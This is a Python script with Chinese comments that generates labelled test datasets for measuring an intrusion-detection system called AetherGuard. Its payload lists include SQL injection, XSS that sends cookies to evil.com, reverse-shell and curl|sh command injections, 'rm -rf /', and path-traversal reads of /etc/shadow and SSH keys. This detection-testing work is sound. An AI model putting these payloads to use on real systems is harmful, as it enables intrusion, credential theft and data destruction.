#!/usr/bin/env python3
"""
AetherGuard 全面安全测试样本生成器 - 主文件
运行此脚本生成完整测试数据集
"""

import json
import random
from datetime import datetime, timedelta
from pathlib import Path

OUTPUT_DIR = Path(__file__).parent
OUTPUT_DIR.mkdir(exist_ok=True)

# ============================================================================
# 数据集定义
# ============================================================================

DATASETS = {
    # 1. SQL 注入 (200 条)
    "sql_injection": {
        "count": 200,
        "payloads": [
            # 基础注入
            "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'/*",
            "1' OR '1'='1", "1 OR 1=1", "1 OR 1=1--",
            "admin'--", "admin'#", "admin'/*",
            "' OR ''='", "' OR 'x'='x",
            # UNION 注入
            "' UNION SELECT NULL--", "' UNION SELECT NULL, NULL--",
            "' UNION SELECT username, password FROM users--",
            "' UNION SELECT table_name FROM information_schema.tables--",
            "' UNION ALL SELECT NULL--",
            "1 UNION SELECT * FROM users--",
            # 报错注入
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--",
            # 时间盲注
            "' AND SLEEP(5)--", "' AND BENCHMARK(10000000,SHA1('test'))--",
            "'; WAITFOR DELAY '0:0:5'--",
            # 堆叠查询
            "'; DROP TABLE users--",
            "'; INSERT INTO users VALUES('hacker','password')--",
            "'; UPDATE users SET password='hacked'--",
            # 绕过变种
            "' oR '1'='1", "' Or '1'='1",
            "'/**/OR/**/'1'='1", "'%20OR%20'1'='1",
            "1' /*!50000OR*/ '1'='1",
            "'||'1'='1", "' or 1=1 limit 1 --",
            "1' order by 1--", "1' order by 2--",
            "' group by 1--", "' having 1=1--",
            # 编码绕过
            "'%27OR%271%27%3D%271",
            "'%2527OR%25271%2527%3D%25271",
            "';%00OR '1'='1",
            # NoSQL
            "{'$gt': ''}", "{'$ne': ''}",
            "{'$regex': '.*'}",
            "{'$where': 'this.password == this.password'}",
        ]
    },
    
    # 2. XSS (200 条)
    "xss": {
        "count": 200,
        "payloads": [
            # 基础
            "<script>alert('XSS')</script>",
            "<script>alert(document.cookie)</script>",
            "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
            # 事件处理器
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<marquee onstart=alert(1)>",
            "<video><source onerror='alert(1)'>",
            "<audio src=x onerror=alert(1)>",
            "<div onmouseover='alert(1)'>move here</div>",
            "<iframe src='javascript:alert(1)'>",
            # 编码
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
            "<a href='javascript:alert(1)'>click</a>",
            # 大小写混合
            "<ScRiPt>alert(1)</sCrIpT>",
            "<IMG SRC=x OnErRoR=alert(1)>",
            # 标签闭合
            "'><script>alert(1)</script>",
            "\"><script>alert(1)</script>",
            "</script><script>alert(1)</script>",
            # 绕过
            "<script/xss>alert(1)</script>",
            "<script>alert(1)//",
            "<!--><script>alert(1)</script>",
            # Polyglot
            "'\"-->]]>*/</script></style></title><script>alert(1)</script>",
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
        ]
    },
    
    # 3. 命令注入 (200 条)
    "command_injection": {
        "count": 200,
        "payloads": [
            # 基础
            "; ls -la", "| ls -la", "&& ls -la", "|| ls -la",
            "& ls -la", "`ls -la`", "$(ls -la)",
            # 信息收集
            "; cat /etc/passwd", "| cat /etc/passwd",
            "; id", "| id", "`id`",
            "; whoami", "| whoami",
            "; uname -a", "| uname -a",
            "; ifconfig", "| ifconfig",
            "; netstat -an", "| netstat -an",
            "; ps aux", "| ps aux",
            # 反弹Shell
            "; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
            "| nc -e /bin/sh 10.0.0.1 4444",
            "; python -c 'import socket...'",
            # 文件操作
            "; rm -rf /", "| rm -rf /*",
            "; wget http://evil.com/malware.sh",
            "; curl http://evil.com/backdoor | sh",
            # Windows
            "& dir", "| dir",
            "& net user attacker password123 /add",
            "& powershell -c \"IEX(New-Object Net.WebClient)...\"",
            # 编码绕过
            ";%20ls%20-la",
            "; $(echo bHMgLWxh | base64 -d)",
        ]
    },
    
    # 4. 路径遍历 (150 条)
    "path_traversal": {
        "count": 150,
        "payloads": [
            # 基础
            "../../../etc/passwd", "../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            # URL编码
            "..%2f..%2f..%2fetc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
            "..%c0%af..%c0%af..%c0%afetc/passwd",
            # 双重编码
            "..%252f..%252f..%252fetc/passwd",
            # Null byte
            "../../../etc/passwd%00",
            "../../../etc/passwd%00.jpg",
            # 绝对路径
            "/etc/passwd", "/etc/shadow", "/etc/hosts",
            "/proc/self/environ", "/var/log/auth.log",
            "/root/.bash_history", "/root/.ssh/id_rsa",
            "C:\\Windows\\System32\\config\\SAM",
            # PHP特定
            "php://filter/convert.base64-encode/resource=/etc/passwd",
            "php://input",
        ]
    },
    
    # 5. 暴力破解 (150 条)
    "brute_force": {
        "count": 150,
        "usernames": [
            "root", "admin", "administrator", "user", "test", "guest",
            "ubuntu", "centos", "oracle", "postgres", "mysql",
            "ftp", "nginx", "apache", "tomcat", "jenkins", "git",
        ],
        "passwords": [
            "123456", "password", "12345678", "qwerty", "123456789",
            "12345", "111111", "1234567", "admin", "root",
            "passw0rd", "P@ssw0rd", "Admin123", "Welcome1",
            "changeme", "default", "temp", "test123",
        ]
    },
    
    # 6. DDoS (100 条)
    "ddos": {
        "count": 100,
        "patterns": [
            "syn_flood", "ack_flood", "udp_flood", "icmp_flood",
            "http_flood", "slowloris", "slow_post",
            "dns_amplification", "ntp_amplification",
        ]
    },
    
    # 7. 端口扫描 (100 条)
    "port_scan": {
        "count": 100,
        "tools": [
            "nmap_syn", "nmap_connect", "nmap_fin", "nmap_null",
            "nmap_xmas", "nmap_udp", "masscan", "zmap",
            "nikto", "nessus", "openvas", "wpscan",
        ]
    },
    
    # 8. 正常流量 (200 条)
    "normal_traffic": {
        "count": 200,
        "samples": [
            "GET / HTTP/1.1\r\nHost: example.com\r\n",
            "GET /api/users HTTP/1.1\r\nHost: api.example.com\r\n",
            "POST /login HTTP/1.1\r\nHost: example.com\r\n\r\nusername=test&password=test123",
            "GET /products?id=123 HTTP/1.1\r\nHost: shop.example.com\r\n",
            "GET /search?q=hello HTTP/1.1\r\nHost: search.example.com\r\n",
            "POST /api/orders HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"product_id\": 123}",
        ]
    },
}

# ============================================================================
# 生成函数
# ============================================================================

def generate_sql_injection(count=200):
    payloads = DATASETS["sql_injection"]["payloads"]
    dataset = []
    for i in range(count):
        payload = random.choice(payloads)
        dataset.append({
            "id": f"sqli_{i:04d}",
            "type": "sql_injection",
            "payload": payload,
            "severity": random.choice(["high", "critical"]),
            "expected_detection": True,
            "source_ip": f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
            "timestamp": (datetime.now() - timedelta(seconds=random.randint(0, 3600))).isoformat()
        })
    return dataset

def generate_xss(count=200):
    payloads = DATASETS["xss"]["payloads"]
    dataset = []
    for i in range(count):
        payload = random.choice(payloads)
        dataset.append({
            "id": f"xss_{i:04d}",
            "type": "xss",
            "payload": payload,
            "severity": random.choice(["medium", "high"]),
            "expected_detection": True,
            "source_ip": f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
            "timestamp": (datetime.now() - timedelta(seconds=random.randint(0, 3600))).isoformat()
        })
    return dataset

def generate_command_injection(count=200):
    payloads = DATASETS["command_injection"]["payloads"]
    dataset = []
    for i in range(count):
        payload = random.choice(payloads)
        dataset.append({
            "id": f"cmdi_{i:04d}",
            "type": "command_injection",
            "payload": payload,
            "severity": "critical",
            "expected_detection": True,
            "source_ip": f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
            "timestamp": (datetime.now() - timedelta(seconds=random.randint(0, 3600))).isoformat()
        })
    return dataset

def generate_path_traversal(count=150):
    payloads = DATASETS["path_traversal"]["payloads"]
    dataset = []
    for i in range(count):
        payload = random.choice(payloads)
        dataset.append({
            "id": f"path_{i:04d}",
            "type": "path_traversal",
            "payload": payload,
            "severity": random.choice(["high", "critical"]),
            "expected_detection": True,
            "source_ip": f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
            "timestamp": (datetime.now() - timedelta(seconds=random.randint(0, 3600))).isoformat()
        })
    return dataset

def generate_brute_force(count=150):
    usernames = DATASETS["brute_force"]["usernames"]
    passwords = DATASETS["brute_force"]["passwords"]
    dataset = []
    for i in range(count):
        username = random.choice(usernames)
        password = random.choice(passwords)
        dataset.append({
            "id": f"brute_{i:04d}",
            "type": "brute_force",
            "username": username,
            "password": password,
            "severity": "high",
            "expected_detection": True,
            "source_ip": f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
            "timestamp": (datetime.now() - timedelta(seconds=random.randint(0, 3600))).isoformat()
        })
    return dataset

def generate_ddos(count=100):
    patterns = DATASETS["ddos"]["patterns"]
    dataset = []
    for i in range(count):
        pattern = random.choice(patterns)
        dataset.append({
            "id": f"ddos_{i:04d}",
            "type": "ddos",
            "pattern": pattern,
            "severity": "critical",
            "expected_detection": True,
            "source_ip": f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
            "packets_per_second": random.randint(1000, 100000),
            "timestamp": (datetime.now() - timedelta(seconds=random.randint(0, 3600))).isoformat()
        })
    return dataset

def generate_port_scan(count=100):
    tools = DATASETS["port_scan"]["tools"]
    dataset = []
    for i in range(count):
        tool = random.choice(tools)
        dataset.append({
            "id": f"scan_{i:04d}",
            "type": "port_scan",
            "tool": tool,
            "severity": "medium",
            "expected_detection": True,
            "source_ip": f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
            "ports_scanned": random.randint(10, 1000),
            "timestamp": (datetime.now() - timedelta(seconds=random.randint(0, 3600))).isoformat()
        })
    return dataset

def generate_normal_traffic(count=200):
    samples = DATASETS["normal_traffic"]["samples"]
    dataset = []
    for i in range(count):
        sample = random.choice(samples)
        dataset.append({
            "id": f"normal_{i:04d}",
            "type": "normal",
            "payload": sample,
            "severity": "none",
            "expected_detection": False,
            "source_ip": f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
            "timestamp": (datetime.now() - timedelta(seconds=random.randint(0, 3600))).isoformat()
        })
    return dataset

# ============================================================================
# 主函数
# ============================================================================

def main():
    print("=" * 70)
    print("AetherGuard 全面安全测试数据集生成器")
    print("=" * 70)
    
    generators = {
        "01_sql_injection.json": generate_sql_injection(200),
        "02_xss.json": generate_xss(200),
        "03_command_injection.json": generate_command_injection(200),
        "04_path_traversal.json": generate_path_traversal(150),
        "05_brute_force.json": generate_brute_force(150),
        "06_ddos.json": generate_ddos(100),
        "07_port_scan.json": generate_port_scan(100),
        "08_normal_traffic.json": generate_normal_traffic(200),
    }
    
    total = 0
    attack_total = 0
    normal_total = 0
    
    for filename, data in generators.items():
        filepath = OUTPUT_DIR / filename
        with open(filepath, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
        
        is_attack = "normal" not in filename
        count = len(data)
        total += count
        if is_attack:
            attack_total += count
            icon = "🔴"
        else:
            normal_total += count
            icon = "🟢"
        
        print(f"{icon} {filename}: {count} 条记录")
    
    # 生成汇总
    summary = {
        "generated_at": datetime.now().isoformat(),
        "total_samples": total,
        "attack_samples": attack_total,
        "normal_samples": normal_total,
        "datasets": {name: len(data) for name, data in generators.items()},
        "usage": {
            "detection_rate_formula": "检测率 = 检测到的攻击数 / 总攻击数 × 100%",
            "false_positive_rate_formula": "误报率 = 误判的正常流量数 / 总正常流量数 × 100%",
            "accuracy_formula": "准确率 = (TP + TN) / 总样本数 × 100%"
        }
    }
    
    summary_path = OUTPUT_DIR / "00_summary.json"
    with open(summary_path, "w", encoding="utf-8") as f:
        json.dump(summary, f, ensure_ascii=False, indent=2)
    
    print("\n" + "=" * 70)
    print("📊 数据集生成完成！")
    print("=" * 70)
    print(f"📁 输出目录: {OUTPUT_DIR}")
    print(f"📊 总样本数: {total}")
    print(f"🔴 攻击样本: {attack_total}")
    print(f"🟢 正常样本: {normal_total}")
    print("=" * 70)
    print("\n📋 测试说明:")
    print("1. 将攻击样本发送到 AetherGuard 进行检测")
    print("2. 记录检测结果（检测到的攻击数）")
    print("3. 将正常样本发送，记录误报数")
    print("4. 计算检测率和误报率")
    print("=" * 70)

if __name__ == "__main__":
    main()
